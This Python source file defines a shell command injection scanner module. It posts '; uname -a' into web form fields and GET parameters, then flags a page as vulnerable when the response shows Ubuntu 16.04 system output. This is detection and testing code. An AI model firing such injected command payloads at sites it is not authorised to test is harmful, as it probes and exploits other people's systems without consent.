import httplib2
import urllib
from urlparse import urljoin, urlparse
from helper import has_form, parse_form, post_request, create_post_params, create_get_params, log_results, has_get_params, get_request
from sets import Set

EXPLOIT_PATH = "exploits/"
EXPLOIT_TYPE = "sci"
EXPLOIT_CLASS = "Command Injection"


class SCIModule:
    """
    Shell Command Injection Module
    Checks for Command Injection vulnerability
    """

    def __init__(self, url, web_pages):
        self.url = url
        self.web_pages = web_pages
        self.logs = {}

    # Check for the string "Ubuntu" and "16.04" in the response - returned by uname -a
    def has_uname_content(self, parsed_response):
        for data_line in parsed_response:
            if "Ubuntu" in data_line and "16.04" in data_line:
                return True
        return False

    def scan(self):
        results = []
        get_param_pages = Set([])
        for web_page in self.web_pages:
            http = httplib2.Http()
            status, response = http.request(web_page)
            if has_form(response):
                forms = parse_form(response)
                original_response = post_request(web_page, forms)
                injection_forms = []
                for form_input in forms:
                    if form_input[0] == "csrftoken": # We don't have incentive to change this
                        injection_forms.append(form_input)
                    else:
                        injection_forms.append((form_input[0], "; uname -a"))
                new_response = post_request(web_page, injection_forms)
                parsed_response = new_response.splitlines()
                if self.has_uname_content(parsed_response):
                    results.append((urlparse(web_page).path, create_post_params(injection_forms), "POST"))
            elif has_get_params(web_page) and urlparse(web_page).path not in get_param_pages:
                parsed_web_page = urlparse(web_page)
                get_param_pages.add(parsed_web_page.path)
                param_list = map(lambda x: x.split("="), parsed_web_page.query.split("&"))
                # original_response = get_request(web_page)
                # random_param_query = "?" + "&".join(map(lambda param: param[0] + "=" + urllib.quote("slkdfjsldk") ,param_list))
                # random_url = parsed_web_page.scheme + "://" + parsed_web_page.netloc + parsed_web_page.path + random_param_query
                # random_response = get_request(random_url)
                malicious_params = []
                for param in param_list:
                    malicious_params.append((param[0], "; uname -a"))
                malicious_param_query = "?" + "&".join(map(lambda malicious_param: malicious_param[0] + "=" + urllib.quote(malicious_param[1]), malicious_params))
                malicious_url = parsed_web_page.scheme  + "://" + parsed_web_page.netloc + parsed_web_page.path + malicious_param_query
                malicious_response = get_request(malicious_url)
                # if malicious_response != original_response and malicious_response != random_response: # That means that the webpage is different, possibly a successful case
                if self.has_uname_content(malicious_response):
                    results.append((urlparse(web_page).path, create_get_params(malicious_url), "GET"))
        self.logs = log_results(self.url, results, EXPLOIT_CLASS)
